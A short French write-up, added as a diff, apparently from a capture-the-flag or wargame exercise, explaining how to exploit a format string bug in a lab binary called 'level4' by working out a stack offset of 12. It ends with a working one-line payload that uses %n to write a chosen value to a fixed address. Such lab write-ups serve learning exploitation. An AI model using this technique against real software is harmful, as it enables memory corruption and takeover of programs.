@@ -1,1 +1,14 @@
+Cet exercice reprend exactement le principe du précédent, mais c'est une sous-fonction qui appelle printf.
+La valeur change également.
+On doit maintenant écrire `16930116` dans `0x08049810`.
+
+Le problème est que maintenant, on ne sait plus quel est l'index du buffer puisque la fonction supplémentaire push sur la stack.
+Mais on peut assez vite résoudre ce problème en trouvant que la fonction ajoute 24 bytes, donc 6 paramètres de type pointeur sous x86 (24 / 4).
+
+Nous étions déjà à 4 pointeurs sur le niveau précédent.\
+`4 + 1 (call) + 1 (push ebp) + 6 (sub esp, 0x18) = 12`
+
+Voici le nouveau code :
+```bash
 (echo $'\x10\x98\x04\x08%16930112d%12$n'; cat) | ./level4
+```
